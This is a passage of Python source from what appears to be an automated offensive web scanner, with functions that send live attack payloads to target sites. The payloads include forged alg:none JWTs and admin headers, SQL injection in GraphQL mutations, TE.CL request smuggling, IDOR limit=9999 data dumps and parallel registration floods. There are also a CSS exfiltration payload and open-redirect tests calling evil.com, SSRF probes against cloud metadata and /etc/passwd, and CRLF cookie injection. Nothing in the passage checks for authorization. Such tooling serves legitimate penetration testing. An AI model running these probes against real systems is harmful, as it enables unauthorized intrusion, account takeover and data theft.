    "sandbox","qa","uat","preprod","pre-prod","prod","production","live",
    "office","intranet","extranet","remote","vpn2","citrix","rdp","ws",
    "socket","ws","wss","push","notify","webhook","callback","events",
    "search","suggest","autocomplete","typeahead","graphql","gql","rest",
    "microservice","service","services","gateway","proxy","lb","loadbalancer",
]

def scan_subdomain_bruteforce(target):
    """DNS brute-force subdomain enumeration — finds what cert transparency misses."""
    findings = []
    found = []
    domain_parts = target.split(".")
    base = ".".join(domain_parts[-2:]) if len(domain_parts) >= 2 else target

    def resolve(sub):
        fqdn = f"{sub}.{base}"
        try:
            ips = socket.getaddrinfo(fqdn, None, socket.AF_INET)
            if ips:
                return fqdn, ips[0][4][0]
        except socket.gaierror:
            pass
        return None, None

    from concurrent.futures import ThreadPoolExecutor, as_completed
    with ThreadPoolExecutor(max_workers=50) as pool:
        futures = {pool.submit(resolve, w): w for w in _DNS_WORDLIST}
        for future in as_completed(futures):
            fqdn, ip = future.result()
            if fqdn:
                found.append(fqdn)
                findings.append({"type": "Subdomain Found (Brute-Force)",
                                 "severity": "info", "url": f"https://{fqdn}",
                                 "detail": f"{fqdn} → {ip}",
                                 "template": "apex-subdomain-brute"})
    return findings, found


def scan_response_diff_auth_bypass(crawl_data):
    """Response diffing — detect auth bypass by comparing authenticated vs unauthenticated responses."""
    findings = []
    auth_paths = ["/admin","/dashboard","/api/admin","/api/users","/api/config",
                  "/internal","/management","/api/v1/users","/api/me","/profile"]
    for page in crawl_data.get("pages",[])[:3]:
        base = "/".join(page["url"].split("/",3)[:3])
        for path in auth_paths:
            url = f"{base}{path}"
            try:
                # Request without auth
                r1 = _S.get(url, timeout=5)
                # Request with fake auth headers
                r2 = _S.get(url, timeout=5, headers={
                    "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.",
                    "X-Auth-Token": "admin",
                    "X-User-Id": "1",
                    "X-Role": "admin",
                })
                # If fake auth returns more content, it's a bypass
                if (r2.status_code == 200 and r1.status_code in (401,403) and
                        len(r2.content) > 100):
                    findings.append({"type": "Auth Bypass via Fake Token",
                                     "severity": "critical", "url": url,
                                     "detail": f"Fake JWT/token returns 200 on {path}",
                                     "template": "apex-auth-diff"})
                elif (r1.status_code == r2.status_code == 200 and
                      abs(len(r1.content) - len(r2.content)) > 500):
                    # Same status but different content — possible privilege escalation
                    findings.append({"type": "Response Diff on Auth Headers",
                                     "severity": "medium", "url": url,
                                     "detail": f"Auth headers change response by {abs(len(r1.content)-len(r2.content))}b",
                                     "template": "apex-auth-diff"})
            except: continue
    return findings


def scan_nextjs_react_vulns(crawl_data, web_targets):
    """Next.js / React specific vulnerabilities."""
    findings = []
    for target in web_targets[:3]:
        # Next.js: /_next/static/chunks/ may expose source maps
        try:
            r = _S.get(f"{target}/_next/static/chunks/", timeout=5)
            if r.status_code == 200 and ".js" in r.text:
                findings.append({"type": "Next.js Chunk Directory Listing",
                                 "severity": "medium", "url": f"{target}/_next/static/chunks/",
                                 "detail": "Next.js chunks directory is listable",
                                 "template": "apex-nextjs"})
        except: pass
        # Next.js: __NEXT_DATA__ leaks server-side props
        try:
            r = _S.get(target, timeout=5)
            next_data = re.search(r'<script id="__NEXT_DATA__"[^>]*>({.*?})</script>', r.text, re.DOTALL)
            if next_data:
                import json as _j
                data = _j.loads(next_data.group(1))
                data_str = str(data)
                if any(x in data_str.lower() for x in ["password","secret","token","key","api","internal","private"]):
                    findings.append({"type": "Next.js __NEXT_DATA__ Sensitive Leak",
                                     "severity": "high", "url": target,
                                     "detail": "Sensitive data in __NEXT_DATA__ server props",
                                     "template": "apex-nextjs"})
        except: pass
        # Next.js: /api/ routes without auth
        for route in ["/api/user","/api/users","/api/me","/api/auth/session",
                      "/api/admin","/api/config","/api/env"]:
            try:
                r = _S.get(f"{target}{route}", timeout=3)
                if r.status_code == 200:
                    try:
                        data = r.json()
                        if isinstance(data, dict) and any(k in str(data).lower()
                                for k in ["email","user","token","session","secret"]):
                            findings.append({"type": f"Next.js API Route Exposed: {route}",
                                             "severity": "high", "url": f"{target}{route}",
                                             "detail": "Next.js API route returns sensitive data without auth",
                                             "template": "apex-nextjs"})
                    except: pass
            except: continue
        # React: dangerouslySetInnerHTML sources in JS
        try:
            r = _S.get(target, timeout=5)
            if "dangerouslySetInnerHTML" in r.text:
                findings.append({"type": "React dangerouslySetInnerHTML Usage",
                                 "severity": "medium", "url": target,
                                 "detail": "dangerouslySetInnerHTML found — potential DOM XSS if user-controlled",
                                 "template": "apex-react"})
        except: pass
    return findings


def scan_graphql_mutation_fuzzing(crawl_data):
    """Fuzz GraphQL mutations for injection, IDOR, and missing auth."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages",[])[:3]:
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in ["/graphql","/api/graphql","/gql"]:
            url = f"{base}{path}"
            # Get schema via introspection
            try:
                r = _S.post(url, json={"query":"{__schema{mutationType{fields{name args{name type{name kind ofType{name}}}}}}}"},
                           headers={"Content-Type":"application/json"}, timeout=5)
                if r.status_code != 200: continue
                data = r.json()
                mutations = (data.get("data",{}).get("__schema",{})
                             .get("mutationType",{}) or {}).get("fields",[]) or []
                for mut in mutations[:10]:
                    name = mut.get("name","")
                    args = mut.get("args",[])
                    # Build a test mutation
                    arg_str = " ".join(f'{a["name"]}: "test"' for a in args[:3])
                    test_query = f'mutation {{ {name}({arg_str}) {{ id }} }}'
                    try:
                        r2 = _S.post(url, json={"query": test_query},
                                    headers={"Content-Type":"application/json"}, timeout=5)
                        body = r2.text.lower()
                        # Check for SQLi in mutation
                        sqli_test = f'mutation {{ {name}({arg_str.replace("test", "test\\' OR \\'1\\'=\\'1")}) {{ id }} }}'
                        r3 = _S.post(url, json={"query": sqli_test},
                                    headers={"Content-Type":"application/json"}, timeout=5)
                        if any(e in r3.text.lower() for e in ["sql","syntax","mysql","ora-","pg_"]):
                            findings.append({"type": f"GraphQL Mutation SQLi: {name}",
                                             "severity": "critical", "url": url,
                                             "detail": f"SQL error in mutation {name}",
                                             "template": "apex-gql-mutation"})
                        # Check if mutation works without auth
                        if r2.status_code == 200 and "errors" not in body and name.lower() in (
                                "createuser","deleteuser","updateuser","createadmin","resetpassword",
                                "changepassword","updateemail","deleteaccount","createtoken"):
                            findings.append({"type": f"GraphQL Mutation Without Auth: {name}",
                                             "severity": "critical", "url": url,
                                             "detail": f"Sensitive mutation {name} accessible without authentication",
                                             "template": "apex-gql-mutation"})
                    except: continue
            except: continue
    return findings


def scan_te_cl_smuggling(web_targets):
    """TE.CL HTTP request smuggling — Transfer-Encoding takes priority over Content-Length."""
    findings = []
    import socket, ssl as _ssl
    for target in web_targets[:5]:
        try:
            parsed = urllib.parse.urlparse(target)
            host = parsed.netloc.split(":")[0]
            port = 443 if parsed.scheme == "https" else 80
            path = parsed.path or "/"

            # TE.CL: server uses TE, backend uses CL
            payload = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"Content-Length: 4\r\n"
                f"\r\n"
                f"5c\r\n"
                f"GPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n"
                f"0\r\n\r\n"
            ).encode()

            sock = socket.create_connection((host, port), timeout=5)
            if port == 443:
                ctx = _ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = _ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.settimeout(8)
            sock.send(payload)
            resp = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk: break
                    resp += chunk
            except: pass
            sock.close()
            resp_str = resp.decode("utf-8", errors="ignore")
            # If we get two responses or a 400 on the smuggled request
            if resp_str.count("HTTP/1.1") >= 2 or "GPOST" in resp_str:
                findings.append({"type": "HTTP Request Smuggling (TE.CL)",
                                 "severity": "critical", "url": target,
                                 "detail": "TE.CL desync — two responses received for one request",
                                 "template": "apex-smuggling-tecl"})
        except: continue
    return findings


def scan_idor_pagination(crawl_data):
    """IDOR via API pagination — ?page=0&limit=9999 dumps all records."""
    findings = []
    for url, params in crawl_data.get("params",{}).items():
        has_page = any(p.lower() in ("page","offset","skip","start","from","cursor") for p in params)
        has_limit = any(p.lower() in ("limit","size","count","per_page","pagesize","take") for p in params)
        if not (has_page or has_limit): continue
        try:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)
            # Try to dump everything
            for p in list(qs.keys()):
                if p.lower() in ("limit","size","count","per_page","pagesize","take"):
                    qs[p] = ["9999"]
                if p.lower() in ("page","offset","skip","start","from"):
                    qs[p] = ["0"]
            test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
            r = _S.get(test_url, timeout=10)
            if r.status_code == 200:
                try:
                    data = r.json()
                    count = len(data) if isinstance(data, list) else len(data.get("data",data.get("items",data.get("results",[]))))
                    if count > 100:
                        has_sensitive = any(k in str(data).lower() for k in
                                           ["email","phone","ssn","credit","password","token","secret"])
                        sev = "critical" if has_sensitive else "high"
                        findings.append({"type": "IDOR via Pagination (Mass Data Exposure)",
                                         "severity": sev, "url": test_url,
                                         "detail": f"limit=9999 returns {count} records",
                                         "template": "apex-idor-pagination"})
                except: pass
        except: continue
    return findings


# ---------------------------------------------------------------------------
# ELITE BATCH 6: Race condition on registration, timing-based user enum,
#                CSS exfil, open redirect → OAuth chain,
#                SSRF via PDF/image generation, NS takeover
# ---------------------------------------------------------------------------

def scan_race_condition_registration(crawl_data):
    """Race condition on registration — create duplicate accounts or bypass limits."""
    import concurrent.futures as _cf
    findings = []
    for page in crawl_data.get("pages",[]):
        url = page["url"]
        if not any(x in url.lower() for x in ["register","signup","join","create-account"]): continue
        base = "/".join(url.split("/",3)[:3])
        for path in ["/register","/signup","/api/register","/api/signup","/api/v1/register"]:
            endpoint = f"{base}{path}"
            uid = int(time.time()) % 100000
            payload = {"email": f"race{uid}@test.com", "username": f"race{uid}",
                       "password": "Test1234!", "name": "Race Test"}
            def attempt(_):
                try:
                    return _S.post(endpoint, json=payload, timeout=5)
                except: return None
            # Fire 10 simultaneous requests
            with _cf.ThreadPoolExecutor(max_workers=10) as pool:
                results = list(pool.map(attempt, range(10)))
            success = [r for r in results if r and r.status_code in (200,201)]
            if len(success) > 1:
                findings.append({"type": "Race Condition on Registration",
                                 "severity": "high", "url": endpoint,
                                 "detail": f"{len(success)}/10 parallel registrations succeeded — duplicate account possible",
                                 "template": "apex-race-reg"})
                break
    return findings


def scan_timing_user_enumeration(crawl_data):
    """Timing-based user enumeration — valid usernames take longer to process."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages",[]):
        if not any(x in page["url"].lower() for x in ["login","signin","auth"]): continue
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in ["/login","/api/login","/auth/login","/signin","/api/signin"]:
            url = f"{base}{path}"
            try:
                times_valid, times_invalid = [], []
                for _ in range(5):
                    start = time.time()
                    _S.post(url, json={"email":"admin@admin.com","password":"wrongpassword_xyz"}, timeout=5)
                    times_valid.append(time.time() - start)
                    start = time.time()
                    _S.post(url, json={"email":f"nonexistent_{int(time.time())}@xyz123.com","password":"wrongpassword_xyz"}, timeout=5)
                    times_invalid.append(time.time() - start)
                avg_valid = sum(times_valid) / len(times_valid)
                avg_invalid = sum(times_invalid) / len(times_invalid)
                diff = abs(avg_valid - avg_invalid)
                if diff > 0.1:  # 100ms timing difference
                    findings.append({"type": "Timing-Based User Enumeration",
                                     "severity": "medium", "url": url,
                                     "detail": f"Valid user avg {avg_valid:.3f}s vs invalid {avg_invalid:.3f}s — {diff*1000:.0f}ms difference",
                                     "template": "apex-timing-enum"})
            except: continue
    return findings


def scan_css_exfil(crawl_data):
    """CSS injection data exfiltration via attribute selectors."""
    findings = []
    # CSS that exfiltrates CSRF tokens via attribute selectors
    # input[name="csrf"][value^="a"] { background: url(https://evil.com/?c=a) }
    css_payload = "}</style><style>input[type=hidden]{background:url(https://evil.com/css-exfil)}"
    for url, params in crawl_data.get("params",{}).items():
        for p in params:
            if not any(x in p.lower() for x in ["style","css","theme","color","class","skin","template"]): continue
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = [css_payload]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                r = _S.get(test_url, timeout=_TIMEOUT)
                if "css-exfil" in r.text and "text/html" in r.headers.get("content-type",""):
                    findings.append({"type": "CSS Injection Data Exfiltration",
                                     "severity": "high", "url": test_url,
                                     "detail": f"CSS injected via '{p}' — can exfiltrate CSRF tokens via attribute selectors",
                                     "template": "apex-css-exfil"})
                    break
            except: continue
    return findings


def scan_open_redirect_oauth_chain(crawl_data):
    """Chain open redirect → OAuth redirect_uri bypass → account takeover."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages",[])[:5]:
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        # Find open redirects first
        redirect_params = ("url","redirect","next","return","goto","dest","continue")
        open_redirects = []
        for url, params in crawl_data.get("params",{}).items():
            if not url.startswith(base): continue
            for p in params:
                if p.lower() not in redirect_params: continue
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = ["https://evil.com"]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=5, allow_redirects=False)
                    if "evil.com" in r.headers.get("Location",""):
                        open_redirects.append(test_url)
                except: continue
        if not open_redirects: continue
        # Now check if OAuth uses this domain as redirect_uri
        for oauth_path in ["/oauth/authorize","/oauth2/authorize","/auth/oauth","/connect/authorize"]:
            try:
                r = _S.get(f"{base}{oauth_path}", timeout=5, allow_redirects=False)
                if r.status_code in (200,302,400):
                    # Try to use open redirect as redirect_uri
                    chain_url = f"{base}{oauth_path}?client_id=test&response_type=code&redirect_uri={urllib.parse.quote(open_redirects[0])}"
                    r2 = _S.get(chain_url, timeout=5, allow_redirects=False)
                    loc = r2.headers.get("Location","")
                    if "evil.com" in loc or open_redirects[0].split("?")[0] in loc:
                        findings.append({"type": "Open Redirect → OAuth Chain (Account Takeover)",
                                         "severity": "critical", "url": chain_url,
                                         "detail": f"OAuth redirect_uri accepts open redirect — auth code leaks to attacker",
                                         "template": "apex-redirect-oauth"})
            except: continue
    return findings


def scan_ssrf_pdf_generation(crawl_data):
    """SSRF via PDF/image generation endpoints — wkhtmltopdf, PhantomJS, ImageMagick."""
    findings = []
    pdf_paths = ["/api/pdf","/api/export/pdf","/api/generate/pdf","/export",
                 "/api/screenshot","/api/render","/api/preview","/api/thumbnail",
                 "/api/convert","/api/image","/api/og-image","/api/social-image",
                 "/pdf","/screenshot","/render","/preview"]
    ssrf_payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost/",
        "file:///etc/passwd",
        "http://0.0.0.0:22",
    ]
    for page in crawl_data.get("pages",[])[:3]:
        base = "/".join(page["url"].split("/",3)[:3])
        for path in pdf_paths:
            url = f"{base}{path}"
            for payload in ssrf_payloads[:2]:
                try:
                    # Try GET with url param
                    for p in ["url","src","source","link","page","target","uri"]:
                        r = _S.get(f"{url}?{p}={urllib.parse.quote(payload)}", timeout=8)
                        if r.status_code == 200 and len(r.content) > 100:
                            content_type = r.headers.get("content-type","").lower()
                            if any(x in content_type for x in ["pdf","image","octet"]):
                                findings.append({"type": "SSRF via PDF/Image Generation",
                                                 "severity": "critical", "url": f"{url}?{p}={payload}",
                                                 "detail": f"PDF/image generator fetches {payload}",
                                                 "template": "apex-ssrf-pdf"})
                                break
                            if any(x in r.text for x in ["root:","ami-id","instance-id"]):
                                findings.append({"type": "SSRF via PDF Generation (Content Confirmed)",
                                                 "severity": "critical", "url": f"{url}?{p}={payload}",
                                                 "detail": "SSRF confirmed — internal content in response",
                                                 "template": "apex-ssrf-pdf"})
                                break
                    # Try POST
                    for p in ["url","src","source","link","page","target","uri","html"]:
                        r = _S.post(url, json={p: payload}, timeout=8,
                                   headers={"Content-Type":"application/json"})
                        if r.status_code == 200 and any(x in r.text for x in ["root:","ami-id"]):
                            findings.append({"type": "SSRF via PDF Generation (POST)",
                                             "severity": "critical", "url": url,
                                             "detail": f"POST {p}={payload} — SSRF confirmed",
                                             "template": "apex-ssrf-pdf"})
                            break
                except: continue
    return findings


def scan_ns_takeover(target, subdomains):
    """Subdomain takeover via dangling NS records — not just CNAME."""
    import subprocess as _sp
    findings = []
    for sub in subdomains[:30]:
        try:
            # Check NS records
            ns_result = _sp.run(["dig","+short","NS",sub],
                               capture_output=True, text=True, timeout=5)
            ns_records = [n.rstrip(".") for n in ns_result.stdout.splitlines() if n.strip()]
            if not ns_records: continue
            # Check if NS servers resolve
            for ns in ns_records:
                try:
                    import socket
                    socket.getaddrinfo(ns, None)
                except socket.gaierror:
                    # NS server doesn't resolve — potential takeover
                    findings.append({"type": "NS Subdomain Takeover",
                                     "severity": "critical", "url": f"dns://{sub}",
                                     "detail": f"NS record {ns} doesn't resolve — NS takeover possible",
                                     "template": "apex-ns-takeover"})
                    break
        except: continue
    return findings


# ---------------------------------------------------------------------------
# Intelligence Engine: dedup, CVSS scoring, attack chain detection,
# false positive reduction, finding verification
# ---------------------------------------------------------------------------

import hashlib as _hashlib

# CVSS-like severity weights
_SEVERITY_SCORE = {"critical": 9.0, "high": 7.0, "medium": 5.0, "low": 2.0, "info": 0.5}

# Attack chain rules: if these finding types co-exist, escalate severity
_CHAIN_RULES = [
    ({"Reflected XSS", "Missing CSRF Token"}, "XSS + No CSRF = Stored Account Takeover", "critical"),
    ({"SSRF", "AWS"}, "SSRF + Cloud Metadata = Credential Theft", "critical"),
    ({"Open Redirect", "OAuth"}, "Open Redirect + OAuth = Account Takeover", "critical"),
    ({"SQL Injection", "Exposed Endpoint"}, "SQLi + Admin Access = Full DB Compromise", "critical"),
    ({"Path Traversal", "Sensitive File"}, "LFI + Sensitive Files = Source Code Disclosure", "critical"),
    ({"CORS Misconfiguration", "JWT"}, "CORS + JWT = Cross-Origin Token Theft", "high"),
    ({"Subdomain Takeover", "Cookie"}, "Subdomain Takeover + Cookie = Session Hijack", "critical"),
    ({"GraphQL Introspection", "Missing Rate Limit"}, "GraphQL + No Rate Limit = Data Enumeration", "high"),
    ({"Prototype Pollution", "XSS"}, "Prototype Pollution + XSS = Universal XSS", "critical"),
    ({"IDOR", "User Enumeration"}, "IDOR + User Enum = Mass Account Compromise", "critical"),
]


def deduplicate_findings(findings):
    """Remove duplicate findings — same type+base_URL = one finding."""
    seen = set()
    unique = []
    for f in findings:
        url = f.get("url","")
        # For param-based findings, deduplicate by type + base path only
        base_url = url.split("?")[0]
        ftype = f.get("type","")
        # For header/info findings, also deduplicate by host only
        if f.get("template","") in ("apex-headers","apex-hsts","apex-clickjack","apex-mime","apex-policy"):
            parsed = urllib.parse.urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
        key = _hashlib.md5(f"{ftype}|{base_url}".encode()).hexdigest()
        if key not in seen:
            seen.add(key)
            unique.append(f)
    return unique


def score_findings(findings):
    """Add CVSS-like score and exploitability rating to each finding."""
    for f in findings:
        sev = f.get("severity","info").lower()
        base_score = _SEVERITY_SCORE.get(sev, 0.5)
        # Boost score for confirmed OOB findings
        if "OOB Confirmed" in f.get("type","") or "Confirmed" in f.get("detail",""):
            base_score = min(10.0, base_score + 1.5)
        # Boost for critical paths
        url = f.get("url","").lower()
        if any(x in url for x in ["/admin","/api/v1","/graphql","/auth","/login"]):
            base_score = min(10.0, base_score + 0.5)
        f["cvss_score"] = round(base_score, 1)
        f["exploitability"] = (
            "Trivial" if base_score >= 9 else
            "Easy" if base_score >= 7 else
            "Moderate" if base_score >= 5 else
            "Hard"
        )
    return sorted(findings, key=lambda x: x.get("cvss_score", 0), reverse=True)


def detect_attack_chains(findings):
    """Find combinations of findings that chain into higher-impact attacks."""
    chains = []
    finding_types = " ".join(f.get("type","") for f in findings)
    for required_types, chain_name, escalated_sev in _CHAIN_RULES:
        if all(any(rt.lower() in f.get("type","").lower() for f in findings)
               for rt in required_types):
            chains.append({
                "type": f"Attack Chain: {chain_name}",
                "severity": escalated_sev,
                "url": "multiple",
                "detail": f"Combined: {' + '.join(required_types)}",
                "template": "apex-chain",
                "cvss_score": _SEVERITY_SCORE.get(escalated_sev, 9.0),
                "exploitability": "Trivial",
                "status": "CHAIN",
            })
    return chains


def verify_finding(finding):
    """Re-verify a finding to reduce false positives."""
    url = finding.get("url","")
    template = finding.get("template","")
    if not url or url == "multiple": return True

    try:
        # Sensitive file findings: verify content is real
        if template == "apex-sensitive":
            r = _S.get(url, timeout=5, allow_redirects=False)
            if r.status_code >= 400: return False
            # Must have real content, not a generic error page
            body = r.text[:500].lower()
            if any(x in body for x in ["not found","404","error","forbidden"]): return False
            # Check it's not the same as a 404 page
            fake = _S.get(url.rsplit("/",1)[0] + "/nonexistent_apex_test_xyz", timeout=3, allow_redirects=False)
            if abs(len(r.content) - len(fake.content)) < 50: return False
            return True

        # Open redirect: re-verify Location actually points to evil.com domain
        if template in ("apex-redirect",) and "?" in url:
            r = _S.get(url, timeout=5, allow_redirects=False)
            loc = r.headers.get("Location", "")
            return _is_open_redirect(loc, "evil.com")

        # XSS: re-verify payload still reflects
        if "xss" in template.lower() and "?" in url:
            r = _S.get(url, timeout=5)
            payload_hint = re.search(r'["\']([^"\']{5,50})["\']', finding.get("detail",""))
            if payload_hint and payload_hint.group(1) not in r.text: return False
            return True

        # Headers: just re-check
        if template == "apex-headers":
            return True  # Low FP rate

        # Default: re-request and check status
        r = _S.get(url, timeout=5)
        return r.status_code < 400

    except: return True  # Don't drop on network error


def prioritize_targets(web_targets, technologies):
    """Reorder targets to scan highest-value endpoints first."""
    tech = " ".join(technologies).lower()
    high_value = []
    normal = []
    for t in web_targets:
        tl = t.lower()
        if any(x in tl for x in ["/admin","/api","/graphql","/auth","/login",
                                   "/dashboard","/internal","/manage","/console"]):
            high_value.append(t)
        elif any(x in tech for x in ["wordpress","django","laravel","spring","rails"]):
            high_value.append(t)
        else:
            normal.append(t)
    return high_value + normal


# ---------------------------------------------------------------------------
# Passive Recon: Shodan, VirusTotal, SecurityTrails (free tier / no key needed)
# ---------------------------------------------------------------------------

def passive_recon(target):
    """Gather intel from public sources without touching the target."""
    findings = []
    subdomains = set()

    # crt.sh (already have get_cert_transparency_subdomains)
    # HackerTarget subdomain API (free, no key)
    try:
        r = requests.get(f"https://api.hackertarget.com/hostsearch/?q={target}", timeout=10)
        if r.status_code == 200 and "," in r.text:
            for line in r.text.splitlines():
                parts = line.split(",")
                if len(parts) >= 1:
                    sub = parts[0].strip()
                    if sub.endswith(f".{target}") or sub == target:
                        subdomains.add(sub)
    except: pass

    # AlienVault OTX (no key needed for passive)
    try:
        r = requests.get(f"https://otx.alienvault.com/api/v1/indicators/domain/{target}/passive_dns",
                        timeout=10, headers={"User-Agent": "ApexCLI"})
        if r.status_code == 200:
            data = r.json()
            for entry in data.get("passive_dns", []):
                hostname = entry.get("hostname", "")
                if hostname.endswith(f".{target}") or hostname == target:
                    subdomains.add(hostname)
    except: pass

    # URLScan.io (no key for search)
    try:
        r = requests.get(f"https://urlscan.io/api/v1/search/?q=domain:{target}&size=100",
                        timeout=10, headers={"User-Agent": "ApexCLI"})
        if r.status_code == 200:
            data = r.json()
            for result in data.get("results", []):
                page = result.get("page", {})
                domain = page.get("domain", "")
                if domain.endswith(f".{target}") or domain == target:
                    subdomains.add(domain)
                # Check for interesting findings in scan results
                for vuln in result.get("verdicts", {}).get("overall", {}).get("tags", []):
                    if vuln in ("malware", "phishing", "suspicious"):
                        findings.append({"type": f"URLScan: {vuln} verdict",
                                         "severity": "high", "url": f"https://{domain}",
                                         "detail": f"URLScan.io flagged {domain} as {vuln}",
                                         "template": "apex-passive"})
    except: pass

    # Wayback CDX for interesting historical endpoints
    try:
        r = requests.get(
            f"https://web.archive.org/cdx/search/cdx?url=*.{target}/*&output=json&fl=original&collapse=urlkey&limit=200&filter=statuscode:200",
            timeout=15)
        if r.status_code == 200:
            urls = r.json()[1:]  # skip header
            for entry in urls:
                url = entry[0] if entry else ""
                if any(x in url for x in [".env", "config", "backup", "admin", "api/v", "graphql",
                                           "swagger", "token", "secret", "password", "debug"]):
                    findings.append({"type": "Passive: Interesting Historical URL",
                                     "severity": "low", "url": url,
                                     "detail": "Found in Wayback Machine — may still be live",
                                     "template": "apex-passive"})
    except: pass

    # DNS history via SecurityTrails (no key for basic)
    try:
        r = requests.get(f"https://api.securitytrails.com/v1/domain/{target}/subdomains",
                        timeout=10, headers={"APIKEY": "none"})
        # Will 401 without key but worth trying
        if r.status_code == 200:
            data = r.json()
            for sub in data.get("subdomains", []):
                subdomains.add(f"{sub}.{target}")
    except: pass

    return list(subdomains), findings


# ---------------------------------------------------------------------------
# Missing vuln classes: null origin CORS, X-HTTP-Method-Override,
#                       cookie header injection, host override chain
# ---------------------------------------------------------------------------

def scan_cors_null_origin(crawl_data):
    """CORS with null origin — sandboxed iframes can send null origin requests."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:10]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        try:
            r = _S.get(page["url"], timeout=5, headers={"Origin": "null"})
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")
            if acao == "null":
                sev = "critical" if acac.lower() == "true" else "high"
                findings.append({"type": "CORS Null Origin Allowed",
                                 "severity": sev, "url": page["url"],
                                 "detail": f"null origin accepted, credentials={acac} — sandboxed iframe attack",
                                 "template": "apex-cors-null"})
        except: pass
    return findings


def scan_method_override(web_targets):
    """X-HTTP-Method-Override / _method bypass — turn GET into DELETE/PUT."""
    findings = []
    override_headers = [
        "X-HTTP-Method-Override",
        "X-Method-Override",
        "X-HTTP-Method",
        "_method",
    ]
    for target in web_targets[:5]:
        for path in ["/api/users/1", "/api/admin", "/api/v1/users/1", "/user/1"]:
            url = f"{target}{path}"
            try:
                # Check if GET returns 200
                r_get = _S.get(url, timeout=5)
                if r_get.status_code != 200: continue
                # Try DELETE via override
                for header in override_headers:
                    r_del = _S.get(url, timeout=5, headers={header: "DELETE"})
                    if r_del.status_code in (200, 204):
                        findings.append({"type": f"HTTP Method Override: {header}",
                                         "severity": "high", "url": url,
                                         "detail": f"{header}: DELETE accepted on {path}",
                                         "template": "apex-method-override"})
                        break
                    r_put = _S.get(url, timeout=5, headers={header: "PUT"})
                    if r_put.status_code in (200, 201):
                        findings.append({"type": f"HTTP Method Override: {header}",
                                         "severity": "high", "url": url,
                                         "detail": f"{header}: PUT accepted on {path}",
                                         "template": "apex-method-override"})
                        break
            except: continue
    return findings


def scan_cookie_injection(crawl_data):
    """Cookie header injection via newline in cookie values."""
    findings = []
    payload = "apex_test=1\r\nSet-Cookie: injected=apex_injected; Path=/"
    for page in crawl_data.get("pages", [])[:5]:
        url = page["url"]
        for param in crawl_data.get("params", {}).get(url.split("?")[0], []):
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[param] = [payload]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                r = _S.get(test_url, timeout=_TIMEOUT)
                # Check if injected cookie appears in response headers
                set_cookies = r.headers.get("Set-Cookie", "")
                if "apex_injected" in set_cookies:
                    findings.append({"type": "Cookie Header Injection",
                                     "severity": "high", "url": test_url,
                                     "detail": f"CRLF injection in param '{param}' sets arbitrary cookies",
                                     "template": "apex-cookie-inject"})
                    break
            except: continue
    return findings


def scan_host_override_chain(web_targets):
    """Host header override chain — X-Forwarded-Host changes internal routing."""
    findings = []
    override_headers = [
        {"X-Forwarded-Host": "internal.localhost"},
        {"X-Forwarded-Host": "169.254.169.254"},
        {"X-Original-Host": "internal.localhost"},
        {"X-Host": "internal.localhost"},
        {"Forwarded": "host=internal.localhost"},
    ]
    for target in web_targets[:3]:
        try:
            baseline = _S.get(target, timeout=5)
            for headers in override_headers:
                r = _S.get(target, timeout=5, headers=headers)
                # Different response = host header affects routing
                if (r.status_code != baseline.status_code or
                        abs(len(r.content) - len(baseline.content)) > 200):
                    hname = list(headers.keys())[0]
                    findings.append({"type": f"Host Override Affects Routing: {hname}",
                                     "severity": "high", "url": target,
                                     "detail": f"{hname} changes response — internal routing bypass possible",
                                     "template": "apex-host-override"})
                    break
        except: pass
    return findings


# ---------------------------------------------------------------------------
# OpenAPI/Swagger spec parser — auto-discovers ALL endpoints + params
# This finds more attack surface than any crawler
# ---------------------------------------------------------------------------

def parse_openapi_spec(base_url):
    """Fetch and parse OpenAPI/Swagger spec, return crawl_data-compatible dict."""
    pages = []
    forms = []
    params = defaultdict(set)

    spec_paths = [
        "/swagger.json", "/swagger/v1/swagger.json", "/swagger/v2/swagger.json",
        "/api-docs", "/api-docs.json", "/api/swagger.json", "/api/v1/swagger.json",
        "/api/v2/swagger.json", "/openapi.json", "/openapi.yaml", "/openapi/v3/openapi.json",
        "/v1/api-docs", "/v2/api-docs", "/v3/api-docs",
        "/swagger-ui/swagger.json", "/docs/swagger.json",
        "/.well-known/openapi.json",
    ]

    spec = None
    spec_url = None
    for path in spec_paths:
        try:
            r = _S.get(f"{base_url}{path}", timeout=5)
            if r.status_code != 200:
                continue
            ctype = r.headers.get("content-type", "")
            if "yaml" in path or "yaml" in ctype:
                try:
                    import yaml
                    spec = yaml.safe_load(r.text)
                except ImportError:
